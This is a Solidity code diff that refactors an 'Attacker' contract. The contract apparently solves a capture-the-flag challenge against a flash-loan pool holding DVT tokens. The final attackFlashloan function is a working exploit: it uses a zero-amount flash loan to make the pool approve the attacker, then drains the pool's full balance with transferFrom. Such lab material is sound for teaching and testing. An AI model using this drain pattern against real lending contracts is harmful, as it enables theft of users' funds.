@@ -1,9 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.12;
 
-import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";
-
-interface ILoan {
+interface IFlashLoan {
     function flashLoan(
         uint256 borrowAmount,
         address borrower,
@@ -16,55 +14,29 @@ interface IERC {
     function balanceOf(address borrower) external view returns (uint256);
 
     function transferFrom(address who, address spender, uint amount) external;
-
-    function approve(address spender, uint256 amount) external returns (bool);
-
-    function transfer(address spender, uint256 amount) external returns (bool);
-}
-
-interface IDamnValuableTokenSnapshot {
-    function snapshot() external returns (uint256);
-
-    function getBalanceAtLastSnapshot(
-        address account
-    ) external view returns (uint256);
 }
 
 contract Attacker {
-    ILoan victimContract;
+    IFlashLoan victimContract;
     IERC DVTToken;
-    IDamnValuableTokenSnapshot snap;
-    uint256 count;
     address owner;
 
-    constructor(address con, address token) {
-        victimContract = ILoan(con);
+    constructor(address _victimCotract, address token) {
+        victimContract = IFlashLoan(_victimCotract);
         DVTToken = IERC(token);
         owner = msg.sender;
-        snap = IDamnValuableTokenSnapshot(token);
     }
 
-    function sendETher() public returns (bool success) {
-        uint borrowAmount = DVTToken.balanceOf(address(victimContract));
-
-        DVTToken.transfer(owner, borrowAmount);
-        return true;
-    }
-
-    function attack() public {
-        uint borrowAmount = DVTToken.balanceOf(address(victimContract));
+    function attackFlashloan() public {
+        uint PoolBalance = DVTToken.balanceOf(address(victimContract));
         bytes memory data = abi.encodeWithSignature(
             "approve(address,uint256)",
             address(this),
-            borrowAmount
+            PoolBalance
         );
         victimContract.flashLoan(0, owner, address(DVTToken), data);
 
-        DVTToken.transferFrom(address(victimContract), owner, borrowAmount);
-    }
-
-    function get() public {
-        uint val = snap.snapshot();
+        DVTToken.transferFrom(address(victimContract), owner, PoolBalance);
     }
 
     fallback() external {}
